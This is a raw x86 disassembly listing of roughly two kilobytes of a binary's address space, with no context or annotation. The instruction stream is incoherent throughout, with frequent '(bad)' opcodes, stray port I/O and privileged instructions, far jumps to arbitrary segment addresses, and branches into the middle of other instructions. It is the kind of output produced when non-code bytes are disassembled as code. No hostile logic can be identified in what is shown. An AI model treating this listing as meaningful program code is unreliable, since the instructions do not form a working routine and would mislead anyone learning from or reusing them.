  4157de:	pop    ebp
  4157df:	lods   eax,DWORD PTR ds:[esi]
  4157e0:	(bad)  
  4157e2:	cli    
  4157e3:	adc    eax,0xddebefd7
  4157e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157e9:	add    edi,DWORD PTR [esi-0x745cb440]
  4157ef:	xchg   edx,eax
  4157f0:	mov    edi,0xffd75ebf
  4157f5:	sbb    al,0x48
  4157f7:	xchg   esi,eax
  4157f8:	push   ecx
  4157f9:	sbb    eax,0xba2de4bf
  4157fe:	jecxz  0x415834
  415800:	cmp    eax,0x8104809b
  415805:	pop    ecx
  415806:	lea    ebx,[esi-0x67d3acd3]
  41580c:	sbb    eax,0xee728fb9
  415811:	fadd   st(1),st
  415813:	repz inc edx
  415815:	pop    eax
  415816:	mov    al,0x4
  415818:	fwait
  415819:	jmp    0x415808
  41581b:	imul   esp,DWORD PTR [ebp+0x1e79d6b],0x1ec62111
  415825:	fnstcw WORD PTR [ecx+0x23]
  415828:	popa   
  415829:	lds    edx,FWORD PTR [eax+ebx*2-0x3c]
  41582d:	sahf   
  41582e:	or     edi,edx
  415830:	inc    esi
  415831:	lea    esi,[eax-0x63]
  415834:	in     eax,dx
  415835:	ins    DWORD PTR es:[edi],dx
  415836:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415837:	adc    al,0x5b
  415839:	icebp  
  41583a:	fisub  WORD PTR [ecx+ebx*8+0x22]
  41583e:	mov    dl,0xfa
  415840:	cld    
  415841:	sahf   
  415842:	mov    ebx,0xdc9283d3
  415847:	ret    
  415848:	icebp  
  415849:	ficomp WORD PTR [edx+ebx*4]
  41584c:	pop    ebp
  41584d:	cdq    
  41584e:	scas   al,BYTE PTR es:[edi]
  41584f:	push   esi
  415850:	(bad)  
  415851:	imul   BYTE PTR [edx]
  415853:	sbb    eax,0xfeb728bc
  415858:	data16 fistp DWORD PTR ds:0x393bacc6
  41585f:	mov    ds:0x1cb0f5ae,eax
  415864:	ret    
  415865:	int3   
  415866:	in     eax,0xda
  415868:	data16 jbe 0x415889
  41586b:	pop    ds
  41586c:	mov    BYTE PTR ds:0xa46ddbea,ah
  415872:	jnp    0x41584c
  415874:	add    esp,esi
  415876:	push   edi
  415877:	clc    
  415878:	shr    ebp,cl
  41587a:	sbb    dl,bh
  41587c:	mov    edi,0x9c45dc8f
  415881:	lods   eax,DWORD PTR ds:[esi]
  415882:	xchg   ebp,eax
  415883:	xor    eax,0x2728b5d5
  415888:	ficomp WORD PTR [ebx-0x41038f45]
  41588e:	fs adc al,0xa9
  415891:	sbb    BYTE PTR ds:0xebd85444,dl
  415897:	aam    0xd0
  415899:	pushf  
  41589a:	jmp    0x7be0c906
  41589f:	into   
  4158a0:	fnsave [ebp-0x45a719af]
  4158a6:	repnz not DWORD PTR [ecx+ecx*8+0x675ddbfd]
  4158ae:	sub    bh,BYTE PTR [eax-0x2e474961]
  4158b4:	and    al,0x9d
  4158b6:	or     esi,DWORD PTR [ecx+0x2f1268a7]
  4158bc:	mov    ecx,0x8cb2a390
  4158c1:	into   
  4158c2:	mov    al,0x54
  4158c4:	pop    eax
  4158c5:	sub    eax,0xdd769880
  4158ca:	cmp    al,0x1e
  4158cc:	(bad)  
  4158cd:	cli    
  4158ce:	sub    eax,0xbaf45225
  4158d3:	push   eax
  4158d4:	adc    al,0x84
  4158d6:	sub    eax,0xcae61ff5
  4158db:	enter  0x995a,0x4b
  4158df:	adc    eax,0xe2b7b56a
  4158e4:	mov    ebp,0x4c07de2d
  4158e9:	jmp    0x68efbbe9
  4158ee:	adc    DWORD PTR [ecx+0x67ed33c4],edx
  4158f4:	in     eax,0x9e
  4158f6:	xchg   bh,ch
  4158f8:	dec    ebp
  4158f9:	aam    0x73
  4158fb:	js     0x415915
  4158fd:	fxch   st(1)
  4158ff:	xchg   edi,eax
  415900:	push   ecx
  415901:	adc    ebp,DWORD PTR [edi-0x7462f451]
  415907:	sub    eax,DWORD PTR [ebx+0x1a]
  41590a:	xlat   BYTE PTR ds:[ebx]
  41590b:	xchg   ecx,eax
  41590c:	loopne 0x41591e
  41590e:	retf   0xd14b
  415911:	enter  0xe4e9,0x96
  415915:	mov    ebp,fs
  415917:	pop    ebx
  415918:	and    ecx,eax
  41591a:	repnz and edi,ebx
  41591d:	cdq    
  41591e:	or     edi,DWORD PTR [ebx+0x34]
  415921:	jno    0x41596a
  415923:	ja     0x41596c
  415925:	dec    esi
  415926:	or     DWORD PTR [esp+ebx*2-0x6d],0xffffffb1
  41592b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41592c:	adc    cl,BYTE PTR [ebx]
  41592e:	jne    0x415972
  415930:	cmp    ecx,ecx
  415932:	dec    ebx
  415933:	stos   BYTE PTR es:[edi],al
  415934:	out    dx,eax
  415935:	test   BYTE PTR [eax],ah
  415937:	xor    eax,0xce75b123
  41593c:	sar    eax,cl
  41593e:	jp     0x415969
  415940:	pop    ecx
  415941:	adc    BYTE PTR [ebp+0xccfe74],bh
  415947:	or     eax,0xf48ebfc5
  41594c:	push   esi
  41594d:	int    0x21
  41594f:	fistp  DWORD PTR [ebx]
  415951:	cdq    
  415952:	mov    edx,0x9c1bb23b
  415957:	and    bh,BYTE PTR [edi-0x62]
  41595a:	jnp    0x4159d2
  41595c:	jp     0x41596a
  41595e:	dec    esi
  41595f:	or     al,0xc2
  415961:	test   eax,0x526b4e7e
  415966:	mov    edi,0x6bb1fe74
  41596b:	push   ebp
  41596c:	mov    ch,0x75
  41596e:	sub    ah,ch
  415970:	rcl    BYTE PTR [edx+0x42a1181a],0x9
  415977:	mov    eax,ds:0x14bcae8c
  41597c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41597d:	xchg   esi,eax
  41597e:	pop    ebp
  41597f:	in     eax,0xa5
  415981:	cld    
  415982:	cmp    bl,dh
  415984:	cmp    eax,0x5aea167
  415989:	ins    BYTE PTR es:[edi],dx
  41598a:	les    ebp,FWORD PTR [edi]
  41598c:	pop    ebp
  41598d:	leave  
  41598e:	pop    edx
  41598f:	pop    esi
  415990:	and    eax,0x6daa747
  415995:	mov    cl,0x13
  415997:	rcl    BYTE PTR [esi],1
  415999:	aas    
  41599a:	mov    eax,0x5aaa135
  41599f:	int    0x17
  4159a1:	stc    
  4159a2:	lods   al,BYTE PTR ds:[esi]
  4159a3:	fsub   QWORD PTR [ecx-0x4c1c9d80]
  4159a9:	popf   
  4159aa:	mov    eax,DWORD PTR [ebx+0x3be0e59a]
  4159b0:	das    
  4159b1:	iret   
  4159b2:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4159b4:	mov    ch,0xc0
  4159b6:	mov    ah,0x94
  4159b8:	sub    DWORD PTR ss:0x81ca25be,ecx
  4159bf:	jmp    0x41599c
  4159c1:	stc    
  4159c2:	cmc    
  4159c3:	ins    BYTE PTR es:[edi],dx
  4159c4:	cs cdq 
  4159c6:	rol    BYTE PTR [eax+0xb5dedc1],0xd8
  4159cd:	inc    esi
  4159ce:	je     0x415952
  4159d0:	and    eax,0x6bec538c
  4159d5:	into   
  4159d6:	mov    WORD PTR ds:[edx+0x385ac19a],cs
  4159dd:	dec    ecx
  4159de:	rcr    DWORD PTR [ecx+0x3441aa12],1
  4159e4:	sbb    BYTE PTR ds:0x9aed2484,al
  4159ea:	retf   
  4159eb:	inc    edi
  4159ec:	call   FWORD PTR [ecx+0x7a27074c]
  4159f2:	jno    0x4159c5
  4159f4:	mov    ds:0x6724bd29,al
  4159f9:	mov    cl,0x2
  4159fb:	sub    DWORD PTR [ecx],edi
  4159fd:	js     0x415a2d
  4159ff:	or     BYTE PTR [edi],0xd1
  415a02:	mov    dh,0xa4
  415a04:	mov    ds:0xc68d668f,eax
  415a09:	mov    dh,BYTE PTR [edx-0x75d2dd7c]
  415a0f:	push   0x5
  415a11:	outs   dx,DWORD PTR ds:[esi]
  415a12:	(bad)  
  415a13:	lock sub BYTE PTR [ecx],0x75
  415a17:	mov    DWORD PTR ds:0xac7ddaa9,ebp
  415a1d:	repz std 
  415a1f:	jns    0x415a3c
  415a21:	pop    edi
  415a22:	pop    esi
  415a23:	(bad)  
  415a24:	cmc    
  415a25:	mov    edi,DWORD PTR [esi-0x16]
  415a28:	adc    dh,BYTE PTR [eax]
  415a2a:	mov    bl,0xc6
  415a2c:	stos   DWORD PTR es:[edi],eax
  415a2d:	int3   
  415a2e:	pop    es
  415a2f:	cmp    eax,0x370d20e
  415a34:	bound  esi,QWORD PTR [edi+0x1e]
  415a37:	lahf   
  415a38:	sbb    ebp,ebx
  415a3a:	iret   
  415a3b:	repnz (bad) 
  415a3d:	push   0xeeb51344
  415a42:	fisub  WORD PTR [esp+esi*4]
  415a45:	pop    eax
  415a46:	xlat   BYTE PTR ds:[ebx]
  415a47:	lods   al,BYTE PTR ds:[esi]
  415a48:	and    ebx,DWORD PTR [ecx+0x3a4b93b7]
  415a4e:	fcomp  DWORD PTR [edi-0xa]
  415a51:	cdq    
  415a52:	stos   DWORD PTR es:[edi],eax
  415a53:	or     eax,0xcea7eb78
  415a58:	in     al,dx
  415a59:	je     0x415ad8
  415a5b:	mov    ah,0x16
  415a5d:	mov    ebx,0x3379f4b4
  415a62:	add    al,0x3d
  415a64:	adc    eax,0x93ed1a92
  415a69:	aas    
  415a6a:	xor    ah,BYTE PTR [ecx-0x8327f73]
  415a70:	xchg   DWORD PTR [eax-0x41],esi
  415a73:	je     0x415ad1
  415a75:	mov    edx,ss
  415a77:	push   es
  415a78:	ss push esi
  415a7a:	jg     0x415a4f
  415a7c:	pop    ds
  415a7d:	pop    edi
  415a7e:	and    eax,0x1bf5a45d
  415a83:	adc    BYTE PTR [esi-0x1c],ah
  415a86:	xchg   ebx,eax
  415a87:	test   al,0x65
  415a89:	scas   eax,DWORD PTR es:[edi]
  415a8a:	fsub   DWORD PTR [ebx-0x24]
  415a8d:	aas    
  415a8e:	mov    bh,0x5c
  415a90:	cmc    
  415a91:	inc    ecx
  415a92:	jmp    0x2b6d:0x7593eeef
  415a99:	cdq    
  415a9a:	pop    esp
  415a9b:	mul    BYTE PTR [edx+0x5]
  415a9e:	pop    esp
  415a9f:	ja     0x415abc
  415aa1:	clc    
  415aa2:	lahf   
  415aa3:	pop    es
  415aa4:	cmc    
  415aa5:	mov    al,0x2b
  415aa7:	dec    ebx
  415aa8:	add    DWORD PTR [edi-0x607f5cc9],eax
  415aae:	inc    ecx
  415aaf:	mov    bl,0x1e
  415ab1:	test   eax,0x2d7b6278
  415ab6:	mov    eax,DWORD PTR [ebx]
  415ab8:	or     al,0xd4
  415aba:	sbb    esp,DWORD PTR [ebp+0x67647600]
  415ac0:	push   ss
  415ac1:	mov    bh,0x4c
  415ac3:	pop    esi
  415ac4:	push   ss
  415ac5:	sub    DWORD PTR [ebx-0x1e],esp
  415ac8:	push   ecx
  415ac9:	push   esp
  415aca:	push   ebx
  415acb:	not    edi
  415acd:	sbb    edx,ebx
  415acf:	inc    esi
  415ad0:	int    0x22
  415ad2:	xor    eax,0x2a1a1528
  415ad7:	call   0x3ab05c22
  415adc:	sbb    DWORD PTR [ecx],ebp
  415ade:	addr16 sbb eax,0x6c864976
  415ae4:	test   BYTE PTR [esi-0x2cec77b5],bl
  415aea:	pop    ss
  415aeb:	ins    BYTE PTR es:[edi],dx
  415aec:	stos   DWORD PTR es:[edi],eax
  415aed:	mov    ecx,0x418b2b92
  415af2:	mov    dh,0xb4
  415af4:	neg    DWORD PTR [ebp+0x3d]
  415af7:	pushf  
  415af8:	sub    eax,0x5faf6b9a
  415afd:	push   es
  415afe:	mov    ds:0x5e1e2ecd,al
  415b03:	add    DWORD PTR [ebx+eax*4],esi
  415b06:	mov    esp,0x8ba42387
  415b0b:	pop    edx
  415b0c:	imul   ebp,eax,0xbd32ba23
  415b12:	test   al,dh
  415b14:	xchg   ecx,eax
  415b15:	mov    bl,0xb9
  415b17:	in     al,0xe0
  415b19:	or     DWORD PTR [edx-0x3f9f8541],ebx
  415b1f:	mov    bl,0x45
  415b21:	fistp  DWORD PTR [edx-0x14]
  415b24:	mov    ch,0xc4
  415b26:	call   0x8244:0x9924c5
  415b2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b2e:	fdivr  DWORD PTR [esi+esi*2-0x57]
  415b32:	jmp    0x415b4f
  415b34:	aaa    
  415b35:	ins    DWORD PTR es:[edi],dx
  415b36:	push   ds
  415b37:	stos   BYTE PTR es:[edi],al
  415b38:	clc    
  415b39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b3a:	leave  
  415b3b:	push   ds
  415b3c:	push   ds
  415b3d:	imul   ebp,DWORD PTR [ecx],0xf0c68623
  415b43:	add    eax,0x87af567a
  415b48:	and    ecx,edi
  415b4a:	in     eax,0x9a
  415b4c:	xchg   edx,eax
  415b4d:	and    BYTE PTR [ecx+0x15],0x20
  415b51:	pop    ecx
  415b52:	push   cs
  415b53:	mov    BYTE PTR [ebp+0x45],al
  415b56:	lahf   
  415b57:	mov    ah,0xa2
  415b59:	test   al,0x5b
  415b5b:	loop   0x415b0c
  415b5d:	ja     0x415b15
  415b5f:	push   eax
  415b60:	bound  eax,QWORD PTR [eax-0x54abdc37]
  415b66:	sbb    DWORD PTR [eax+0x1b76623d],0xffffffd8
  415b6d:	daa    
  415b6e:	ja     0x415be4
  415b70:	mov    ch,0x46
  415b72:	adc    ebp,edx
  415b74:	(bad)  
  415b75:	in     al,0xa8
  415b77:	mov    dh,0x54
  415b79:	test   eax,0xe612499
  415b7e:	jnp    0x415b68
  415b80:	out    dx,al
  415b81:	pop    ebp
  415b82:	dec    ebx
  415b83:	jo     0x415b6a
  415b85:	call   0x7c6e:0x41f4f12f
  415b8c:	loopne 0x415b28
  415b8e:	inc    ebp
  415b8f:	mov    ebp,0x40cafdf6
  415b94:	rcl    DWORD PTR [edx],cl
  415b96:	mov    ah,0xf1
  415b98:	fs cmp esp,0xef39d71b
  415b9f:	push   eax
  415ba0:	jp     0x415c07
  415ba2:	mov    edx,0x62a91eda
  415ba7:	outs   dx,DWORD PTR ds:[esi]
  415ba8:	and    BYTE PTR [esi-0x46533752],dl
  415bae:	imul   esi,DWORD PTR [ecx-0x8cdd78b],0xbe44f0bd
  415bb8:	clc    
  415bb9:	add    DWORD PTR [ecx],ebx
  415bbb:	in     al,dx
  415bbc:	and    bl,BYTE PTR [ecx-0xb]
  415bbf:	mov    ebx,0x4608c2b8
  415bc4:	popf   
  415bc5:	pop    ss
  415bc6:	or     al,0x2c
  415bc8:	pushf  
  415bc9:	mul    BYTE PTR ds:0xb6f752dc
  415bcf:	icebp  
  415bd0:	add    eax,0x50cab04b
  415bd5:	add    DWORD PTR [edi-0x23bd0888],edx
  415bdb:	int    0x7d
  415bdd:	mov    edx,0x5fe5fc75
  415be2:	scas   eax,DWORD PTR es:[edi]
  415be3:	out    dx,eax
  415be4:	dec    esp
  415be5:	iret   
  415be6:	jmp    0x415bae
  415be8:	aad    0x9a
  415bea:	mov    cl,0x74
  415bec:	and    eax,0x95f73e30
  415bf1:	dec    eax
  415bf2:	add    al,0xee
  415bf4:	pusha  
  415bf5:	adc    BYTE PTR [eax+0x42],cl
  415bf8:	and    ecx,DWORD PTR [ecx-0x1e79ed5e]
  415bfe:	stc    
  415bff:	mov    dh,0xdf
  415c01:	add    cl,ch
  415c03:	pop    ebp
  415c04:	jmp    0x90aa:0xc02b0bd6
  415c0b:	ins    DWORD PTR es:[edi],dx
  415c0c:	inc    edi
  415c0d:	push   eax
  415c0e:	cmp    ebp,edi
  415c10:	sbb    dh,BYTE PTR [esi+0x22]
  415c13:	xchg   ebp,eax
  415c14:	and    edi,DWORD PTR [edx+0x21]
  415c17:	in     al,dx
  415c18:	out    0xa7,eax
  415c1a:	fwait
  415c1b:	loop   0x415c84
  415c1d:	push   DWORD PTR [eax+0x1d7a073e]
  415c23:	xor    edx,ebx
  415c25:	sbb    edi,DWORD PTR [edx-0x71b328c]
  415c2b:	pop    esp
  415c2c:	xor    eax,0xcce92adb
  415c31:	out    0x2b,al
  415c33:	nop
  415c34:	sbb    ecx,ecx
  415c36:	xor    al,0x6c
  415c38:	sar    BYTE PTR [esi],0x4d
  415c3b:	xchg   BYTE PTR [edx],al
  415c3d:	stos   BYTE PTR es:[edi],al
  415c3e:	jmp    0x415c18
  415c40:	ja     0x415bcd
  415c42:	aam    0x9b
  415c44:	fistp  WORD PTR [edi]
  415c46:	mov    BYTE PTR [edi-0x4f9406e9],ch
  415c4c:	xor    BYTE PTR [edi],al
  415c4e:	jnp    0x415cc4
  415c50:	call   0x469e29eb
  415c55:	mov    eax,ds:0x8f2e9d8b
  415c5a:	mov    BYTE PTR [edx-0x7820cf6d],bl
  415c60:	mov    ah,0xa2
  415c62:	imul   ebx,eax,0xffffffcf
  415c65:	cmp    al,0xfa
  415c67:	xchg   esp,eax
  415c68:	cmp    BYTE PTR [esi-0x13],bl
  415c6b:	fild   WORD PTR [edx+eiz*4+0x43]
  415c6f:	push   esp
  415c70:	out    0x83,eax
  415c72:	or     esi,eax
  415c74:	push   ss
  415c75:	stc    
  415c76:	popa   
  415c77:	aaa    
  415c78:	jne    0x415c02
  415c7a:	push   eax
  415c7b:	sbb    al,0xaa
  415c7d:	mov    eax,0x3df2a1cb
  415c82:	mov    al,BYTE PTR [edi]
  415c84:	jmp    DWORD PTR [edx]
  415c86:	test   eax,0x102931be
  415c8b:	ds pushf 
  415c8d:	mov    ds:0xa75e0081,al
  415c92:	mov    BYTE PTR [ebx-0xcb7977b],al
  415c98:	push   cs
  415c99:	or     al,0xae
  415c9b:	clc    
  415c9c:	sub    eax,0xffb2e70
  415ca1:	(bad)  
  415ca2:	mov    edx,0x7b65a194
  415ca7:	cmp    BYTE PTR [ebp+0x2e],al
  415caa:	jo     0x415ca3
  415cac:	ret    
  415cad:	movlhps xmm1,xmm4
  415cb0:	dec    ecx
  415cb1:	push   esi
  415cb2:	adc    ecx,esi
  415cb4:	btc    DWORD PTR [esi+edi*1],edi
  415cb8:	and    ebp,eax
  415cba:	hlt    
  415cbb:	mov    DWORD PTR [ebp+0x48],ecx
  415cbe:	clc    
  415cbf:	adc    al,0x9d
  415cc1:	fwait
  415cc2:	pop    ebx
  415cc3:	lods   eax,DWORD PTR ds:[esi]
  415cc4:	out    dx,al
  415cc5:	ror    DWORD PTR [eax],cl
  415cc7:	adc    al,0x7
  415cc9:	jae    0x415c9f
  415ccb:	jecxz  0x415cfa
  415ccd:	xchg   edx,eax
  415cce:	mov    edx,0x980246c4
  415cd3:	imul   edx,DWORD PTR ds:0x20f46f6c,0xc5b6b74
  415cdd:	sub    ebp,DWORD PTR [edi]
  415cdf:	inc    edx
  415ce0:	and    al,0xf9
  415ce2:	(bad)  
  415ce3:	xchg   DWORD PTR [ecx],esi
  415ce5:	mov    edx,0xfde58dc2
  415cea:	scas   eax,DWORD PTR es:[edi]
  415ceb:	clc    
  415cec:	in     eax,dx
  415ced:	inc    ebp
  415cee:	loope  0x415c71
  415cf0:	mov    ch,0x1
  415cf2:	int3   
  415cf3:	mov    cl,0xd9
  415cf5:	addr16 push ebx
  415cf7:	jne    0x415d1e
  415cf9:	imul   ebp,DWORD PTR [ecx+0x5d],0x61dd1fd8
  415d00:	lds    eax,FWORD PTR [edi+0x21]
  415d03:	in     eax,dx
  415d04:	cmp    edi,DWORD PTR [esi]
  415d06:	xchg   edi,eax
  415d07:	push   ss
  415d08:	and    al,0x9
  415d0a:	call   0xbc62c3f6
  415d0f:	mov    cl,0x9c
  415d11:	fwait
  415d12:	sbb    edi,ebp
  415d14:	mov    DWORD PTR [esi],ecx
  415d16:	pushf  
  415d17:	xor    eax,0x5f27d339
  415d1c:	into   
  415d1d:	pop    ecx
  415d1e:	mov    al,0x94
  415d20:	xor    DWORD PTR [eax],ebp
  415d22:	imul   esp,DWORD PTR [ebx-0x57],0xffffffd4
  415d26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d27:	pushf  
  415d28:	cld    
  415d29:	mov    bh,BYTE PTR [ecx+0x7857bbf4]
  415d2f:	fwait
  415d30:	outs   dx,DWORD PTR ds:[esi]
  415d31:	cmp    eax,0xc277f71c
  415d36:	mov    ebp,0xab99a3b4
  415d3b:	cwde   
  415d3c:	xor    bh,BYTE PTR [ecx-0x18368858]
  415d42:	mov    dh,0x6e
  415d44:	xor    BYTE PTR [ebx+0xbcc699],bh
  415d4a:	mov    esp,0x3ba21e00
  415d4f:	iret   
  415d50:	(bad)  
  415d52:	xor    edx,DWORD PTR [ebp+0x13]
  415d55:	sbb    DWORD PTR [ebx+0x28],ebp
  415d58:	and    ecx,DWORD PTR [esp+edx*2]
  415d5b:	repz retf 
  415d5d:	test   al,0x11
  415d5f:	das    
  415d60:	add    eax,0x4ecadd6
  415d65:	xchg   BYTE PTR [edx-0x9],ah
  415d68:	sbb    al,0x19
  415d6a:	test   DWORD PTR [eax+0x28],esp
  415d6d:	pop    esp
  415d6e:	pop    esi
  415d6f:	retf   
  415d70:	pop    ebx
  415d71:	shl    BYTE PTR [edx+0x39],1
  415d74:	inc    ebp
  415d75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d76:	jae    0x415d65
  415d78:	mov    al,0x5
  415d7a:	cdq    
  415d7b:	inc    esi
  415d7c:	push   ss
  415d7d:	jns    0x415daa
  415d7f:	xchg   esp,eax
  415d80:	ins    BYTE PTR es:[edi],dx
  415d81:	daa    
  415d82:	or     eax,0x3c113010
  415d87:	mov    eax,ds:0x18f6693a
  415d8c:	pop    edi
  415d8d:	pushf  
  415d8e:	mov    edx,0x47c98de7
  415d93:	xchg   ebp,eax
  415d94:	fst    QWORD PTR [ebx+0x1283798d]
  415d9a:	mov    esp,0xc8bf9692
  415d9f:	retf   0xdd1c
  415da2:	push   esp
  415da3:	div    BYTE PTR [ebx-0x24]
  415da6:	pop    edi
  415da7:	addr16 and bh,cl
  415daa:	iret   
  415dab:	sbb    eax,DWORD PTR [ecx+0x10]
  415dae:	push   ebx
  415daf:	pop    DWORD PTR [edx]
  415db1:	test   al,0xab
  415db3:	mov    dh,0xc3
  415db5:	cwde   
  415db6:	and    BYTE PTR [edx-0x333cd795],0x27
  415dbd:	cmp    BYTE PTR [ebp-0x3a591f1c],dh
  415dc3:	jmp    0x415e11
  415dc5:	cdq    
  415dc6:	sub    edi,ecx
  415dc8:	test   al,0x7f
  415dca:	pop    edx
  415dcb:	or     al,0x6
  415dcd:	cmp    BYTE PTR [edi],0x7e
  415dd0:	xchg   edi,eax
  415dd1:	scas   eax,DWORD PTR es:[edi]
  415dd2:	mov    al,0xb4
  415dd4:	repz push ebx
  415dd6:	inc    edi
  415dd7:	mov    dl,0xbb
  415dd9:	and    edi,DWORD PTR [edx+0x52f80deb]
  415ddf:	jb     0x415e0f
  415de1:	mov    DWORD PTR [ecx+0x3e08e9b3],edi
  415de7:	push   edi
  415de8:	fdivr  st(5),st
  415dea:	hlt    
  415deb:	xchg   esp,eax
  415dec:	or     DWORD PTR [esi+0x613b74ca],ebp
  415df2:	mov    ecx,0x1e311d64
  415df7:	xchg   bh,bh
  415df9:	jbe    0x415db6
  415dfb:	push   esp
  415dfc:	xchg   esi,eax
  415dfd:	scas   eax,DWORD PTR es:[edi]
  415dfe:	or     eax,DWORD PTR [ebp+eax*8+0x3afb6452]
  415e05:	mov    ebp,0x9e3329fc
  415e0a:	mov    edx,0xf6892ef5
  415e0f:	push   cs
  415e10:	popa   
  415e11:	jg     0x415dde
  415e13:	fcom   st(6)
  415e15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e16:	inc    ebx
  415e17:	inc    esp
  415e18:	inc    ebp
  415e19:	aad    0xd3
  415e1b:	jmp    0x53b04317
  415e20:	xchg   esi,eax
  415e21:	out    0xcc,eax
  415e23:	out    0xdf,al
  415e25:	cdq    
  415e26:	mov    ch,0xd4
  415e28:	pop    ebp
  415e29:	add    eax,DWORD PTR [esp+eax*8-0x18b1e23b]
  415e30:	sub    DWORD PTR [ebp+0x7e],0xddb9249a
  415e37:	fisub  DWORD PTR [edx+0x4d]
  415e3a:	(bad)  
  415e3b:	fisttp DWORD PTR [ecx-0x7a727967]
  415e41:	mov    es,WORD PTR [ebp-0x18]
  415e44:	mov    esp,0x15788617
  415e49:	cli    
  415e4a:	(bad)  
  415e4b:	push   esi
  415e4c:	outs   dx,DWORD PTR ds:[esi]
  415e4d:	popf   
  415e4e:	das    
  415e4f:	daa    
  415e50:	xchg   DWORD PTR [edi-0x5cabb068],ecx
  415e56:	mov    ebx,0x3efa74ec
  415e5b:	mov    al,0xf6
  415e5d:	mov    DWORD PTR [ebx+0x44bf7959],esi
  415e63:	xchg   ebp,eax
  415e64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e65:	xor    DWORD PTR [edx-0x17],eax
  415e68:	or     eax,0x48b14bcd
  415e6d:	clc    
  415e6e:	fs sub al,0x1d
  415e71:	pop    ecx
  415e72:	je     0x415ea5
  415e74:	add    ebx,DWORD PTR [ebx]
  415e76:	cdq    
  415e77:	rol    DWORD PTR [ebp-0xa02a4a7],cl
  415e7d:	cs sbb ebx,esi
  415e80:	or     eax,0x1abf8af5
  415e85:	fldenv [edi]
  415e87:	push   edx
  415e88:	jmp    0x415e67
  415e8a:	inc    ebp
  415e8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e8c:	bt     ebx,ebp
  415e8f:	cli    
  415e90:	rcl    BYTE PTR [ebp-0x6a],1
  415e93:	(bad)  
  415e95:	xor    dh,BYTE PTR [edx+0x8]
  415e98:	pop    ds
  415e99:	jle    0x415f16
  415e9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e9c:	sub    al,0x76
  415e9e:	mov    bh,0x44
  415ea0:	(bad)  
  415ea1:	test   al,0x4b
  415ea3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ea4:	pop    ebp
  415ea5:	mov    ebx,0x16bf9028
  415eaa:	mov    al,bh
  415eac:	mov    ah,0xa0
  415eae:	mov    cl,0x94
  415eb0:	call   0x6a36:0x85a4ac02
  415eb7:	std    
  415eb8:	dec    edi
  415eb9:	int    0xe2
  415ebb:	fadd   QWORD PTR [ecx+0x4df28ac6]
  415ec1:	push   esp
  415ec2:	mov    dl,0xf4
  415ec4:	push   ss
  415ec5:	and    eax,0x43840f3
  415eca:	jle    0x415ebc
  415ecc:	mov    ds:0xe968173c,al
  415ed1:	jno    0x415e85
  415ed3:	inc    esp
  415ed4:	std    
  415ed5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ed6:	cmp    DWORD PTR [esi],ebx
  415ed8:	mov    bh,0xb0
  415eda:	fsub   DWORD PTR [edi+0x30db994c]
  415ee0:	mov    BYTE PTR [esi-0x62],dl
  415ee3:	push   edx
  415ee4:	pop    esp
  415ee5:	mov    al,0x7d
  415ee7:	dec    ebx
  415ee8:	aam    0xbe
  415eea:	mov    edi,0x973c48a4
  415eef:	sub    eax,0xeaf97f85
  415ef4:	(bad)  
  415ef5:	retf   0x9e27
  415ef8:	and    eax,0x3d87a219
  415efd:	add    esp,DWORD PTR [eax]
  415eff:	or     al,0x24
  415f01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f02:	fwait
  415f03:	cmc    
  415f04:	fcomi  st,st(0)
  415f06:	sub    al,0xb7
  415f08:	call   0xb57a:0xf59d89c1
  415f0f:	xchg   esp,eax
  415f10:	mov    bh,0x8c
  415f12:	cmp    al,0x58
  415f14:	adc    eax,0x2ae8c5cd
  415f19:	test   eax,0xc061d44d
  415f1e:	(bad)  
  415f1f:	cmc    
  415f20:	ret    
  415f21:	jmp    0x62c7:0x7d3284b2
  415f28:	(bad)  
  415f29:	cmp    eax,0xaf1bd3b1
  415f2e:	in     eax,0xd1
  415f30:	(bad)  
  415f31:	stc    
  415f32:	(bad)  
  415f33:	imul   ebx,DWORD PTR [edx],0xffffffe9
  415f36:	xor    eax,0xdaa09343
  415f3b:	(bad)  
  415f3c:	dec    esi
  415f3d:	sub    BYTE PTR [ebp+0x23459679],0xbd
  415f44:	cdq    
  415f45:	adc    al,0xb5
  415f47:	mov    ah,0x8c
  415f49:	dec    eax
  415f4a:	not    BYTE PTR [esi-0x7b406634]
  415f50:	mov    al,0xc2
  415f52:	push   edi
  415f53:	jae    0x415faa
  415f55:	(bad)  
  415f56:	pop    ebx
  415f57:	out    0xd4,eax
  415f59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f5a:	sbb    eax,0x95fcd739
  415f5f:	scas   eax,DWORD PTR es:[edi]
  415f60:	xor    eax,0xfde69f8e
  415f65:	loop   0x415f97
  415f67:	fidiv  WORD PTR ds:0x8be873c4
  415f6d:	int    0x7e
  415f6f:	(bad)  
  415f70:	and    edi,DWORD PTR [ecx+0x26]
  415f73:	inc    eax
  415f74:	pop    es
  415f75:	mov    ch,0x5e
  415f77:	or     DWORD PTR [ebx-0x5b],eax
  415f7a:	dec    ebx
  415f7b:	lea    ebx,[edx+0x38]
  415f7e:	loop   0x415fd3
  415f80:	hlt    
  415f81:	pop    edx
  415f82:	xor    eax,0xb044c577
  415f87:	xor    al,0x91
  415f89:	lock leave 
  415f8b:	add    ah,BYTE PTR ds:0x33f1a89b
  415f91:	push   ss
  415f92:	xchg   ebp,eax
  415f93:	jmp    0x1c7d28bb
  415f98:	inc    ebp
  415f99:	not    DWORD PTR [esi-0x4c]
  415f9c:	xchg   esi,eax
  415f9d:	or     BYTE PTR [edx-0x76ca1a6c],bl
  415fa3:	out    dx,eax
  415fa4:	sbb    bl,BYTE PTR [edx]
